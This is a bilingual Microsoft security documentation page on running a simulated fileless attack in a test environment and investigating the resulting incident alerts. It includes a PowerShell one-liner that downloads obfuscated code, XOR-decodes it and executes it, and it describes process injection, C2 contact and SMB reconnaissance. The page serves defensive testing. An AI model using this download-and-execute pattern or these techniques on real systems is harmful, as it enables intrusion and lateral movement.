---
title: 运行 Microsoft 威胁防护攻击模拟
description: 为 Microsoft 威胁防护试点项目运行攻击模拟，以了解如何随即展开和快速解决问题。
keywords: Microsoft 威胁防护试点攻击模拟，运行 Microsoft 威胁防护试点攻击模拟，模拟 Microsoft 威胁防护、Microsoft 威胁防护试点项目、网络安全、高级持久威胁、企业安全性、设备、设备、标识、用户、数据、应用程序、事件、自动化调查和修正、高级搜寻
search.product: eADQiWindows 10XVcnh
search.appverid: met150
ms.prod: microsoft-365-enterprise
ms.mktglfcycl: deploy
ms.sitesec: library
ms.pagetype: security
f1.keywords:
- NOCSH
ms.author: dolmont
author: DulceMontemayor
ms.localizationpriority: medium
manager: dansimp
audience: ITPro
ms.collection: M365-security-compliance
ms.topic: conceptual
ms.openlocfilehash: aa4767deac30641e39880c2eeb001c2dc884540a
ms.sourcegitcommit: dcbcd5ef278949c777059b0aa6db072e821f72dd
ms.translationtype: MT
ms.contentlocale: zh-CN
ms.lasthandoff: 09/21/2020
ms.locfileid: "48173316"
---
# <a name="run-your-microsoft-threat-protection-attack-simulations"></a><span data-ttu-id="2a198-104">运行 Microsoft 威胁防护攻击模拟</span><span class="sxs-lookup"><span data-stu-id="2a198-104">Run your Microsoft Threat Protection attack simulations</span></span>  

<span data-ttu-id="2a198-105">**适用于：**</span><span class="sxs-lookup"><span data-stu-id="2a198-105">**Applies to:**</span></span>
- <span data-ttu-id="2a198-106">Microsoft 威胁防护</span><span class="sxs-lookup"><span data-stu-id="2a198-106">Microsoft Threat Protection</span></span>

<span data-ttu-id="2a198-107">准备好试点环境后，可以测试 Microsoft 威胁防护事件管理和自动调查和修正功能。</span><span class="sxs-lookup"><span data-stu-id="2a198-107">After preparing your pilot environment, it’s time to test the Microsoft Threat Protection incident management and automated investigation and remediation capabilities.</span></span> <span data-ttu-id="2a198-108">我们将帮助您模拟一种复杂的攻击，利用从检测中隐藏的高级技术。</span><span class="sxs-lookup"><span data-stu-id="2a198-108">We will help you to simulate a sophisticated attack that leverages advanced techniques to hide from detection.</span></span> <span data-ttu-id="2a198-109">攻击在域控制器上枚举打开的服务器消息块 (SMB) 会话，并检索用户设备的最近 IP 地址。</span><span class="sxs-lookup"><span data-stu-id="2a198-109">The attack enumerates opened Server Message Block (SMB) sessions on domain controllers and retrieves recent IP addresses of users’ devices.</span></span> <span data-ttu-id="2a198-110">这种类型的攻击通常不包括在受攻击者的设备上丢弃的文件，它们仅发生在内存中。</span><span class="sxs-lookup"><span data-stu-id="2a198-110">This category of attacks usually doesn’t include files dropped on the victim’s device—they occur solely in memory.</span></span> <span data-ttu-id="2a198-111">它们通过使用现有的系统和管理工具并将其代码注入系统进程以隐藏其执行，从而使其避开检测并在设备上持续存在，从而 "实时脱离土地"。</span><span class="sxs-lookup"><span data-stu-id="2a198-111">They “live off the land” by using existing system and administrative tools and inject their code into system processes to hide their execution, allowing them to evade detection and persist on the device.</span></span>

<span data-ttu-id="2a198-112">在此模拟中，我们的示例方案从 PowerShell 脚本开始。</span><span class="sxs-lookup"><span data-stu-id="2a198-112">In this simulation, our sample scenario starts with a PowerShell script.</span></span> <span data-ttu-id="2a198-113">用户可能会欺骗运行脚本。</span><span class="sxs-lookup"><span data-stu-id="2a198-113">A user might be tricked into running a script.</span></span> <span data-ttu-id="2a198-114">或者，该脚本可能从以前受感染的设备的远程连接到另一台计算机，攻击者试图在网络中移动横向。</span><span class="sxs-lookup"><span data-stu-id="2a198-114">Or the script might run from a remote connection to another computer from a previously infected device—the attacker attempting to move laterally in the network.</span></span> <span data-ttu-id="2a198-115">由于管理员通常会远程运行脚本来执行各种管理活动，因此检测到这些脚本可能很困难。</span><span class="sxs-lookup"><span data-stu-id="2a198-115">Detection of these scripts can be difficult because administrators also often run scripts remotely to carry out various administrative activities.</span></span>

![使用进程注入和 SMB reconnaisance 攻击图的 Fileless PowerShell 攻击](../../media/mtp/mtpdiydiagram.png)

<span data-ttu-id="2a198-117">在模拟过程中，攻击会将外壳代码注入到看似合法的过程中。</span><span class="sxs-lookup"><span data-stu-id="2a198-117">During the simulation, the attack injects shellcode into a seemingly innocent process.</span></span> <span data-ttu-id="2a198-118">在这种情况下，我们将使用 notepad.exe。</span><span class="sxs-lookup"><span data-stu-id="2a198-118">In this scenario, we’ll use notepad.exe.</span></span> <span data-ttu-id="2a198-119">我们为模拟选择了此过程，但攻击者更有可能将系统视为长时间运行的系统进程，如 svchost.exe。</span><span class="sxs-lookup"><span data-stu-id="2a198-119">We chose this process for the simulation, but attackers will more likely target a long-running system process, such as svchost.exe.</span></span> <span data-ttu-id="2a198-120">然后，代码管理代码会继续联系攻击者的命令和控件 (C2) server，以获取有关如何继续的说明。</span><span class="sxs-lookup"><span data-stu-id="2a198-120">The shellcode then goes on to contact the attacker’s command-and-control (C2) server to receive instructions on how to proceed.</span></span> <span data-ttu-id="2a198-121">此外，该脚本会尝试针对域控制器执行针对域控制器的侦测查询 (DC) 。</span><span class="sxs-lookup"><span data-stu-id="2a198-121">In addition, the script attempts executing reconnaissance queries against the domain controller (DC).</span></span> <span data-ttu-id="2a198-122">这使得攻击者能够获取有关最近用户登录信息的信息。</span><span class="sxs-lookup"><span data-stu-id="2a198-122">This allows an attacker to get information about recent user login information.</span></span> <span data-ttu-id="2a198-123">一旦攻击者拥有这些信息，就可以在网络中横向移动以获取特定的敏感帐户</span><span class="sxs-lookup"><span data-stu-id="2a198-123">Once attackers have this information, they can move laterally in the network to get to a specific sensitive account</span></span>

>[!IMPORTANT]
><span data-ttu-id="2a198-124">为获得最佳结果，请尽可能严格遵循攻击模拟说明。</span><span class="sxs-lookup"><span data-stu-id="2a198-124">For optimum results, follow the attack simulation instructions as closely as possible.</span></span>


## <a name="simulation-environment-requirements"></a><span data-ttu-id="2a198-125">模拟环境要求</span><span class="sxs-lookup"><span data-stu-id="2a198-125">Simulation environment requirements</span></span>

<span data-ttu-id="2a198-126">由于你已在准备阶段配置了试点环境，因此请确保在此方案中有两个设备：测试设备和域控制器。</span><span class="sxs-lookup"><span data-stu-id="2a198-126">Since you have already configured your pilot environment during the preparation phase, ensure that you have two devices for this scenario: a test device and a domain controller.</span></span>

1.  <span data-ttu-id="2a198-127">验证你的租户是否有 [保护](https://docs.microsoft.com/microsoft-365/security/mtp/mtp-enable#starting-the-service)。</span><span class="sxs-lookup"><span data-stu-id="2a198-127">Verify your tenant has [Protection](https://docs.microsoft.com/microsoft-365/security/mtp/mtp-enable#starting-the-service)￼￼.</span></span>
2.  <span data-ttu-id="2a198-128">验证测试域控制器配置：</span><span class="sxs-lookup"><span data-stu-id="2a198-128">Verify your test domain controller configuration:</span></span>
    - <span data-ttu-id="2a198-129">使用 Windows Server 2008 R2 或更高版本运行的设备。</span><span class="sxs-lookup"><span data-stu-id="2a198-129">Device runs with Windows Server 2008 R2 or a later version.</span></span>
    - <span data-ttu-id="2a198-130">测试域控制器到 [Azure 高级威胁防护](https://docs.microsoft.com/azure/security-center/security-center-wdatp) 并启用 [远程管理](https://docs.microsoft.com/windows-server/administration/server-manager/configure-remote-management-in-server-manager)。</span><span class="sxs-lookup"><span data-stu-id="2a198-130">The test domain controller to [Azure Advanced Threat Protection](https://docs.microsoft.com/azure/security-center/security-center-wdatp) and enable [remote management](https://docs.microsoft.com/windows-server/administration/server-manager/configure-remote-management-in-server-manager).</span></span>    
    - <span data-ttu-id="2a198-131">验证 [AZURE ATP 和 Microsoft 云应用安全集成](https://docs.microsoft.com/cloud-app-security/aatp-integration) 是否已启用。</span><span class="sxs-lookup"><span data-stu-id="2a198-131">Verify that [Azure ATP and Microsoft Cloud App Security integration](https://docs.microsoft.com/cloud-app-security/aatp-integration) have been enabled.</span></span>
    - <span data-ttu-id="2a198-132">在您的域中创建一个测试用户–不需要管理员权限。</span><span class="sxs-lookup"><span data-stu-id="2a198-132">A test user is created on your domain – no admin permissions needed.</span></span>

3.  <span data-ttu-id="2a198-133">验证测试设备配置：</span><span class="sxs-lookup"><span data-stu-id="2a198-133">Verify test device configuration:</span></span>
    <br>
    <span data-ttu-id="2a198-134">a.</span><span class="sxs-lookup"><span data-stu-id="2a198-134">a.</span></span>  <span data-ttu-id="2a198-135">使用 Windows 10 版本1903或更高版本运行的设备。</span><span class="sxs-lookup"><span data-stu-id="2a198-135">Device runs with Windows 10 version 1903 or a later version.</span></span>
    <br>
    <span data-ttu-id="2a198-136">b.</span><span class="sxs-lookup"><span data-stu-id="2a198-136">b.</span></span>  <span data-ttu-id="2a198-137">测试设备已加入测试域。</span><span class="sxs-lookup"><span data-stu-id="2a198-137">Test device is joined to the test domain.</span></span>
    <br>
    <span data-ttu-id="2a198-138">c.</span><span class="sxs-lookup"><span data-stu-id="2a198-138">c.</span></span>  <span data-ttu-id="2a198-139">[启用 Windows Defender 防病毒](https://docs.microsoft.com/windows/security/threat-protection/windows-defender-antivirus/configure-windows-defender-antivirus-features)。</span><span class="sxs-lookup"><span data-stu-id="2a198-139">[Turn on Windows Defender Antivirus](https://docs.microsoft.com/windows/security/threat-protection/windows-defender-antivirus/configure-windows-defender-antivirus-features).</span></span> <span data-ttu-id="2a198-140">如果你在启用 Windows Defender 防病毒时遇到问题，请参阅此 [故障排除主题](https://docs.microsoft.com/windows/security/threat-protection/microsoft-defender-atp/troubleshoot-onboarding#ensure-that-windows-defender-antivirus-is-not-disabled-by-a-policy)。</span><span class="sxs-lookup"><span data-stu-id="2a198-140">If you are having trouble enabling Windows Defender Antivirus, see this [troubleshooting topic](https://docs.microsoft.com/windows/security/threat-protection/microsoft-defender-atp/troubleshoot-onboarding#ensure-that-windows-defender-antivirus-is-not-disabled-by-a-policy).</span></span>
    <br>
    <span data-ttu-id="2a198-141">d.</span><span class="sxs-lookup"><span data-stu-id="2a198-141">d.</span></span>  <span data-ttu-id="2a198-142">验证测试设备是否 [载入到 Microsoft Defender 高级威胁防护 (MDATP) ](https://docs.microsoft.com/windows/security/threat-protection/microsoft-defender-atp/configure-endpoints)。</span><span class="sxs-lookup"><span data-stu-id="2a198-142">Verify that the test device is [onboarded to Microsoft Defender Advanced Threat Protection (MDATP)](https://docs.microsoft.com/windows/security/threat-protection/microsoft-defender-atp/configure-endpoints).</span></span>

<span data-ttu-id="2a198-143">如果使用现有租户并实现设备组，请为测试设备创建专用设备组，并将其推送到配置 UX 中的顶层。</span><span class="sxs-lookup"><span data-stu-id="2a198-143">If you use an existing tenant and implement device groups, create a dedicated device group for the test device and push it to top level in configuration UX.</span></span>


## <a name="run-the-simulation"></a><span data-ttu-id="2a198-144">运行模拟</span><span class="sxs-lookup"><span data-stu-id="2a198-144">Run the simulation</span></span>

<span data-ttu-id="2a198-145">要运行攻击方案模拟，请执行以下操作：</span><span class="sxs-lookup"><span data-stu-id="2a198-145">To run the attack scenario simulation:</span></span>

1.  <span data-ttu-id="2a198-146">使用测试用户帐户登录到测试设备。</span><span class="sxs-lookup"><span data-stu-id="2a198-146">Log in to the test device with the test user account.</span></span>

2.  <span data-ttu-id="2a198-147">在测试设备上打开 Windows PowerShell 窗口。</span><span class="sxs-lookup"><span data-stu-id="2a198-147">Open a Windows PowerShell window on the test device.</span></span>

3.  <span data-ttu-id="2a198-148">复制以下模拟脚本：</span><span class="sxs-lookup"><span data-stu-id="2a198-148">Copy the following simulation script:</span></span>
```
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;$xor
= [System.Text.Encoding]::UTF8.GetBytes('WinATP-Intro-Injection');$base64String = (Invoke-WebRequest -URI "https://winatpmanagement.windows.com/client/management/static/MTP_Fileless_Recon.txt"
-UseBasicParsing).Content;Try{ $contentBytes = [System.Convert]::FromBase64String($base64String) } Catch { $contentBytes = [System.Convert]::FromBase64String($base64String.Substring(3)) };$i = 0;
$decryptedBytes = @();$contentBytes.foreach{ $decryptedBytes += $_ -bxor $xor[$i];
$i++; if ($i -eq $xor.Length) {$i = 0} };Invoke-Expression ([System.Text.Encoding]::UTF8.GetString($decryptedBytes))
```
>[!NOTE]
><span data-ttu-id="2a198-149">如果您在 web 浏览器上打开此文档，则在复制整个文本时可能会遇到问题，而不会丢失某些字符或引入额外的换行符。</span><span class="sxs-lookup"><span data-stu-id="2a198-149">If you open this document on a web browser, you might encounter problems copying the full text without losing certain characters or introducing extra line breaks.</span></span> <span data-ttu-id="2a198-150">下载此文档并在 Adobe Reader 中打开它。</span><span class="sxs-lookup"><span data-stu-id="2a198-150">Download this document and open it on Adobe Reader.</span></span>

4. <span data-ttu-id="2a198-151">在提示符处，粘贴并运行复制的脚本。</span><span class="sxs-lookup"><span data-stu-id="2a198-151">At the prompt, paste and run the copied script.</span></span>

>[!NOTE]
><span data-ttu-id="2a198-152">如果使用远程桌面协议 (RDP) 运行 PowerShell，请使用 RDP 客户端中的 "键入剪贴板文本" 命令，因为在使用 **CTRL + V** 热键或右键单击-paste 方法时，可能不起作用。</span><span class="sxs-lookup"><span data-stu-id="2a198-152">If you're running PowerShell using remote desktop protocol (RDP), use the Type Clipboard Text command in the RDP client because the **CTRL-V** hotkey or right-click-paste method might not work.</span></span>  <span data-ttu-id="2a198-153">最新版本的 PowerShell 有时也不会接受该方法，您可能需要先在内存中复制到记事本，在虚拟机中复制它，然后将其粘贴到 PowerShell 中。</span><span class="sxs-lookup"><span data-stu-id="2a198-153">Recent versions of PowerShell sometimes will also not accept that method, you might have to copy to Notepad in memory first, copy it in the virtual machine, and then paste it into PowerShell.</span></span>

<span data-ttu-id="2a198-154">稍后， <i>notepad.exe</i> 将会打开。</span><span class="sxs-lookup"><span data-stu-id="2a198-154">A few seconds later, <i>notepad.exe</i> will open.</span></span> <span data-ttu-id="2a198-155">模拟的攻击代码将被注入 notepad.exe 中。</span><span class="sxs-lookup"><span data-stu-id="2a198-155">A simulated attack code will be injected into notepad.exe.</span></span> <span data-ttu-id="2a198-156">将自动生成的记事本实例保持打开状态，以体验完整方案。</span><span class="sxs-lookup"><span data-stu-id="2a198-156">Keep the automatically generated Notepad instance open to experience the full scenario.</span></span>

<span data-ttu-id="2a198-157">模拟的攻击代码将尝试与外部 IP 地址进行通信， (模拟 C2 server) 然后尝试通过 SMB 针对域控制器进行侦测。</span><span class="sxs-lookup"><span data-stu-id="2a198-157">The simulated attack code will attempt to communicate to an external IP address (simulating the C2 server) and then attempt reconnaissance against the domain controller through SMB.</span></span>

<span data-ttu-id="2a198-158">此脚本完成后，你将看到 PowerShell 控制台上显示一条消息。</span><span class="sxs-lookup"><span data-stu-id="2a198-158">You will see a message displayed on the PowerShell console when this script completes.</span></span>

```
ran NetSessionEnum against [DC Name] with return code result 0      
```

<span data-ttu-id="2a198-159">若要查看活动的自动事件和响应功能，请保持 notepad.exe 过程处于打开状态。</span><span class="sxs-lookup"><span data-stu-id="2a198-159">To see the Automated Incident and Response feature in action, keep the notepad.exe process open.</span></span> <span data-ttu-id="2a198-160">你将看到自动化事件和响应停止了记事本进程。</span><span class="sxs-lookup"><span data-stu-id="2a198-160">You will see Automated Incident and Response stop the Notepad process.</span></span>


## <a name="investigate-an-incident"></a><span data-ttu-id="2a198-161">调查事件</span><span class="sxs-lookup"><span data-stu-id="2a198-161">Investigate an incident</span></span>

>[!NOTE]
><span data-ttu-id="2a198-162">在我们引导您完成此模拟之前，请观看以下视频，了解事件管理如何帮助您将相关警报作为调查过程的一部分在一起，在门户中找到相关警报，以及它如何帮助您完成安全操作：</span><span class="sxs-lookup"><span data-stu-id="2a198-162">Before we walk you through this simulation, watch the following video to see how incident management helps you piece the related alerts together as part of the investigation process, where you can find it in the portal, and how it can help you in your security operations:</span></span>

>[!VIDEO https://www.microsoft.com/videoplayer/embed/RE4Bzwz?]

<span data-ttu-id="2a198-163">切换到 SOC 分析师的观点，现在可以开始在 Microsoft 365 安全中心门户中调查攻击。</span><span class="sxs-lookup"><span data-stu-id="2a198-163">Switching to the SOC analyst point of view, you can now start to investigate the attack in the Microsoft 365 Security Center portal.</span></span> 

1.  <span data-ttu-id="2a198-164">从任何设备打开 [Microsoft 365 安全中心门户](https://security.microsoft.com/incidents) 事件队列。</span><span class="sxs-lookup"><span data-stu-id="2a198-164">Open the [Microsoft 365 Security Center portal](https://security.microsoft.com/incidents) incident queue from any device.</span></span>

2.  <span data-ttu-id="2a198-165">从菜单中导航到 " **事件** "。</span><span class="sxs-lookup"><span data-stu-id="2a198-165">Navigate to **Incidents** from the menu.</span></span> 

    ![Microsoft 365 安全中心左侧菜单上显示的事件的屏幕截图](../../media/mtp/fig1.png)

3.  <span data-ttu-id="2a198-167">模拟攻击的新事件将显示在事件队列中。</span><span class="sxs-lookup"><span data-stu-id="2a198-167">The new incident for the simulated attack will appear in the incident queue.</span></span>
 
    ![事件队列的屏幕截图](../../media/mtp/fig2.png)


### <a name="investigate-the-attack-as-a-single-incident"></a><span data-ttu-id="2a198-169">将攻击调查为单个事件</span><span class="sxs-lookup"><span data-stu-id="2a198-169">Investigate the attack as a single incident</span></span>

<span data-ttu-id="2a198-170">Microsoft 威胁防护关联分析，并将来自不同产品的所有相关的警报和调查聚合到一个事件实体中。</span><span class="sxs-lookup"><span data-stu-id="2a198-170">Microsoft Threat Protection correlates analytics and aggregates all related alerts and investigations from different products into one incident entity.</span></span> <span data-ttu-id="2a198-171">通过执行此操作，Microsoft 威胁防护显示了更广泛的攻击情景，使 SOC 分析师能够理解并响应复杂的威胁。</span><span class="sxs-lookup"><span data-stu-id="2a198-171">By doing so, Microsoft Threat Protection shows a broader attack story, allowing the SOC analyst to understand and respond to complex threats.</span></span>

<span data-ttu-id="2a198-172">此模拟过程中生成的警报与相同的威胁相关联，因此将自动聚合为单个事件。</span><span class="sxs-lookup"><span data-stu-id="2a198-172">The alerts generated during this simulation are associated with the same threat, and as a result, are automatically aggregated as a single incident.</span></span>

<span data-ttu-id="2a198-173">要查看事件，请执行以下操作：</span><span class="sxs-lookup"><span data-stu-id="2a198-173">To view the incident:</span></span>

1.  <span data-ttu-id="2a198-174">导航到 " **事件** " 队列。</span><span class="sxs-lookup"><span data-stu-id="2a198-174">Navigate to the **Incidents** queue.</span></span>
 
    ![导航菜单中的事件屏幕截图](../../media/mtp/fig1.png)

2.  <span data-ttu-id="2a198-176">通过单击事件名称左侧的圆圈选择最新的项目。</span><span class="sxs-lookup"><span data-stu-id="2a198-176">Select the newest item by clicking on the circle located left of the incident name.</span></span> <span data-ttu-id="2a198-177">侧面板显示有关事件的其他信息，包括所有相关警报。</span><span class="sxs-lookup"><span data-stu-id="2a198-177">A side panel displays additional information about the incident, including all the related alerts.</span></span> <span data-ttu-id="2a198-178">每个事件都有一个唯一的名称，它根据它包含的警报的属性对其进行描述。</span><span class="sxs-lookup"><span data-stu-id="2a198-178">Each incident has a unique name that describes it based on the attributes of the alerts it includes.</span></span>

    ![在模拟期间聚合生成的警报的 "事件" 页面的屏幕截图](../../media/mtp/fig4.png)

    <span data-ttu-id="2a198-180">可以根据服务资源筛选仪表板中显示的警报： Azure ATP、Microsoft 云应用安全性、Microsoft Defender ATP、Microsoft 威胁防护和 Office ATP。</span><span class="sxs-lookup"><span data-stu-id="2a198-180">The alerts that shows in the dashboard can be filtered based on service resources: Azure ATP, Microsoft Cloud App Security, Microsoft Defender ATP, Microsoft Threat Protection, and Office ATP.</span></span>  

3.  <span data-ttu-id="2a198-181">选择 " **打开事件" 页** ，以获取有关事件的详细信息。</span><span class="sxs-lookup"><span data-stu-id="2a198-181">Select **Open incident page** to get more information about the incident.</span></span>

    <span data-ttu-id="2a198-182">在 " **事件** " 页中，您可以查看与事件相关的所有警报和信息。</span><span class="sxs-lookup"><span data-stu-id="2a198-182">In the **Incident** page, you can see all the alerts and information related to the incident.</span></span> <span data-ttu-id="2a198-183">这包括警报中涉及的实体和资产、警报的检测源 (Azure ATP、EDR) 以及它们链接在一起的原因。</span><span class="sxs-lookup"><span data-stu-id="2a198-183">This includes the entities and assets that are involved in the alert, the detection source of the alerts (Azure ATP, EDR), and the reason they were linked together.</span></span> <span data-ttu-id="2a198-184">查看事件警报列表将显示攻击的进展情况。</span><span class="sxs-lookup"><span data-stu-id="2a198-184">Reviewing the incident alert list shows the progression of the attack.</span></span> <span data-ttu-id="2a198-185">在此视图中，你可以查看和调查各个通知。</span><span class="sxs-lookup"><span data-stu-id="2a198-185">From this view, you can see and investigate the individual alerts.</span></span>

    <span data-ttu-id="2a198-186">您还可以单击右侧菜单中的 " **管理事件** "、"将事件标记为"、"将其分配给自己" 和 "添加注释"。</span><span class="sxs-lookup"><span data-stu-id="2a198-186">You can also click **Manage incident** from the right-hand menu, to tag the incident, assign it to yourself, and add comments.</span></span>

    ![单击管理事件的位置的屏幕截图](../../media/mtp/fig5a.png)

    ![<span data-ttu-id="2a198-188">"管理事件" 面板中的字段的屏幕截图，可在其中对事件进行标记、将其分配给自己以及添加注释</span><span class="sxs-lookup"><span data-stu-id="2a198-188">Screenshot of the fields on the manage incident panel where you can tag the incident, assign it to yourself, and add comments</span></span> ](../../media/mtp/fig5b.png)


### <a name="review-generated-alerts"></a><span data-ttu-id="2a198-189">查看生成的警报</span><span class="sxs-lookup"><span data-stu-id="2a198-189">Review generated alerts</span></span> 

<span data-ttu-id="2a198-190">让我们来看看在模拟攻击过程中生成的一些警报。</span><span class="sxs-lookup"><span data-stu-id="2a198-190">Let’s look at some of the alerts generated during the simulated attack.</span></span>

>[!NOTE]
><span data-ttu-id="2a198-191">我们将只经历在模拟攻击过程中生成的几个警报。</span><span class="sxs-lookup"><span data-stu-id="2a198-191">We’ll walk through only a few of the alerts generated during the simulated attack.</span></span> <span data-ttu-id="2a198-192">根据在测试设备上运行的 Windows 和 Microsoft 威胁防护产品的版本，您可能会看到更多以略有不同的顺序显示的警报。</span><span class="sxs-lookup"><span data-stu-id="2a198-192">Depending on the version of Windows and the Microsoft Threat Protection products running on your test device, you might see more alerts that appear in a slightly different order.</span></span>

![生成的警报的屏幕截图](../../media/mtp/fig6.png) 


<span data-ttu-id="2a198-194">\*\*警报：已观察到可疑进程注入 (源： Microsoft Defender ATP EDR) \*\*</span><span class="sxs-lookup"><span data-stu-id="2a198-194">**Alert: Suspicious process injection observed (Source: Microsoft Defender ATP EDR)**</span></span>

<span data-ttu-id="2a198-195">高级攻击者使用复杂且 stealthy 的方法来保留在内存中，并从检测工具中隐藏。</span><span class="sxs-lookup"><span data-stu-id="2a198-195">Advanced attackers use sophisticated and stealthy methods to persist in memory and hide from detection tools.</span></span> <span data-ttu-id="2a198-196">一种常见的技术是在受信任的系统进程中运行，而不是恶意的可执行文件，从而使检测工具和安全操作难以发现恶意代码。</span><span class="sxs-lookup"><span data-stu-id="2a198-196">One common technique is to operate from within a trusted system process rather than a malicious executable, making it hard for detection tools and security operations to spot the malicious code.</span></span>

<span data-ttu-id="2a198-197">为了让 SOC 分析师能够捕获这些高级攻击，Microsoft Defender ATP 中的深度内存传感器提供了我们的云服务，具有前所未有的跨进程代码注入技术的可见性。</span><span class="sxs-lookup"><span data-stu-id="2a198-197">To allow the SOC analysts to catch these advanced attacks, deep memory sensors in Microsoft Defender ATP provide our cloud service with unprecedented visibility into a variety of cross-process code injection techniques.</span></span> <span data-ttu-id="2a198-198">下图显示了在尝试插入代码以 <i>notepad.exe</i>时，MICROSOFT Defender ATP 如何检测和收到警报。</span><span class="sxs-lookup"><span data-stu-id="2a198-198">The following figure shows how Microsoft Defender ATP detected and alerted on the attempt to inject code to <i>notepad.exe</i>.</span></span>

![可能存在恶意代码的注入警报的屏幕截图](../../media/mtp/fig7.png) 


<span data-ttu-id="2a198-200">\*\*警报：进程在不使用任何命令行参数的情况运行时观察到的意外行为 (源： Microsoft Defender ATP EDR) \*\*</span><span class="sxs-lookup"><span data-stu-id="2a198-200">**Alert: Unexpected behavior observed by a process run with no command line arguments (Source: Microsoft Defender ATP EDR)**</span></span>

<span data-ttu-id="2a198-201">Microsoft Defender ATP 检测通常针对攻击技术的最常见属性。</span><span class="sxs-lookup"><span data-stu-id="2a198-201">Microsoft Defender ATP detections often target the most common attribute of an attack technique.</span></span> <span data-ttu-id="2a198-202">这样可确保持续性并提高攻击者切换到较新策略的这一栏。</span><span class="sxs-lookup"><span data-stu-id="2a198-202">This ensures durability and raises the bar for attackers to switch to newer tactics.</span></span>

<span data-ttu-id="2a198-203">我们采用大规模学习算法来建立组织和全球范围内的常见流程的正常行为，并在这些流程表现出异常行为时进行监视。</span><span class="sxs-lookup"><span data-stu-id="2a198-203">We employ large-scale learning algorithms to establish the normal behavior of common processes within an organization and worldwide and watch for when these processes exhibit anomalous behaviors.</span></span> <span data-ttu-id="2a198-204">这些反常行为通常表示引入了无关的代码并在其他受信任的进程中运行。</span><span class="sxs-lookup"><span data-stu-id="2a198-204">These anomalous behaviors often indicate that extraneous code was introduced and is running in an otherwise trusted process.</span></span>

<span data-ttu-id="2a198-205">在这种情况下，进程 <i>notepad.exe</i> 表现为异常行为，涉及与外部位置的通信。</span><span class="sxs-lookup"><span data-stu-id="2a198-205">For this scenario, the process <i>notepad.exe</i> is exhibiting abnormal behavior, involving communication with an external location.</span></span> <span data-ttu-id="2a198-206">此结果与用于引入和执行恶意代码的特定方法无关。</span><span class="sxs-lookup"><span data-stu-id="2a198-206">This outcome is independent of the specific method used to introduce and execute the malicious code.</span></span>

>[!NOTE]
><span data-ttu-id="2a198-207">由于此警报是基于需要其他后端处理的机器学习模型，因此可能需要一段时间才能在门户中看到此警报。</span><span class="sxs-lookup"><span data-stu-id="2a198-207">Because this alert is based on machine-learning models that require additional backend processing, it might take some time before you see this alert in the portal.</span></span>

<span data-ttu-id="2a198-208">请注意，警报详细信息包括外部 IP 地址（一个指示器，可用作透视以展开调查）。</span><span class="sxs-lookup"><span data-stu-id="2a198-208">Notice that the alert details include the external IP address—an indicator that you can use as a pivot to expand investigation.</span></span>

<span data-ttu-id="2a198-209">单击警报进程树中的 IP 地址以查看 "IP 地址详细信息" 页。</span><span class="sxs-lookup"><span data-stu-id="2a198-209">Click the IP address in the alert process tree to view the IP address details page.</span></span>

![未使用任何命令行参数运行的进程的意外行为警报的屏幕截图](../../media/mtp/fig8.png) 

<span data-ttu-id="2a198-211">下图显示了 "选定的 IP 地址详细信息" 页 (单击警报进程树中的 "IP 地址") 。</span><span class="sxs-lookup"><span data-stu-id="2a198-211">The following figure displays the selected IP Address details page (clicking on IP address in the Alert process tree).</span></span>
<span data-ttu-id="2a198-212">![IP 地址详细信息页面的屏幕截图](../../media/mtp/fig9.png)</span><span class="sxs-lookup"><span data-stu-id="2a198-212">![Screenshot of the IP address details page](../../media/mtp/fig9.png)</span></span>


<span data-ttu-id="2a198-213">\*\*警报：用户和 IP 地址侦测 (SMB)  (源： Azure ATP) \*\*</span><span class="sxs-lookup"><span data-stu-id="2a198-213">**Alert: User and IP address reconnaissance (SMB) (Source: Azure ATP)**</span></span>

<span data-ttu-id="2a198-214">使用服务器消息块 (SMB) 协议进行枚举使攻击者能够获取最新的用户登录信息，以帮助他们通过网络进行横向移动以访问特定的敏感帐户。</span><span class="sxs-lookup"><span data-stu-id="2a198-214">Enumeration using Server Message Block (SMB) protocol enables attackers to get recent user logon information that helps them move laterally through the network to access a specific sensitive account.</span></span>

<span data-ttu-id="2a198-215">在此检测中，当对域控制器运行 SMB 会话枚举时，将触发警报。</span><span class="sxs-lookup"><span data-stu-id="2a198-215">In this detection, an alert is triggered when the SMB session enumeration runs against a domain controller.</span></span>

![用于用户和 IP 地址侦察的 Azure ATP 警报的屏幕截图](../../media/mtp/fig10.png) 


### <a name="review-the-device-timeline-microsoft-defender-atp"></a><span data-ttu-id="2a198-217">查看设备时间线 [Microsoft Defender ATP]</span><span class="sxs-lookup"><span data-stu-id="2a198-217">Review the device timeline [Microsoft Defender ATP]</span></span>
<span data-ttu-id="2a198-218">在探索了此事件中的各种警报后，再导航回之前调查的 "事件" 页。</span><span class="sxs-lookup"><span data-stu-id="2a198-218">After exploring the various alerts in this incident, navigate back to the incident page you investigated earlier.</span></span> <span data-ttu-id="2a198-219">单击 "事件" 页中的 " **设备** " 选项卡，查看在 MICROSOFT Defender ATP 和 Azure atp 报告的此事件中涉及的设备。</span><span class="sxs-lookup"><span data-stu-id="2a198-219">Click the **Devices** tab in the incident page to review the devices involved in this incident as reported by Microsoft Defender ATP and Azure ATP.</span></span>

<span data-ttu-id="2a198-220">单击执行攻击的设备的名称，以打开该特定设备的实体页面。</span><span class="sxs-lookup"><span data-stu-id="2a198-220">Click the name of the device where the attack was conducted, to open the entity page for that specific device.</span></span> <span data-ttu-id="2a198-221">在该页面中，可以看到已触发的警报和相关事件。</span><span class="sxs-lookup"><span data-stu-id="2a198-221">In that page, you can see alerts that were triggered and related events.</span></span>

<span data-ttu-id="2a198-222">单击 " **时间线** " 选项卡以打开设备时间线，并按时间顺序查看设备上观测到的所有事件和行为，并与触发的警报交错。</span><span class="sxs-lookup"><span data-stu-id="2a198-222">Click the **Timeline** tab to open the device timeline and view all events and behaviors observed on the device in chronological order, interspersed with the alerts raised.</span></span>

![包含行为的设备日程表的屏幕截图](../../media/mtp/fig11.png) 

<span data-ttu-id="2a198-224">扩展一些更有趣的行为可提供有用的详细信息，如进程树。</span><span class="sxs-lookup"><span data-stu-id="2a198-224">Expanding some of the more interesting behaviors provides useful details, such as process trees.</span></span>

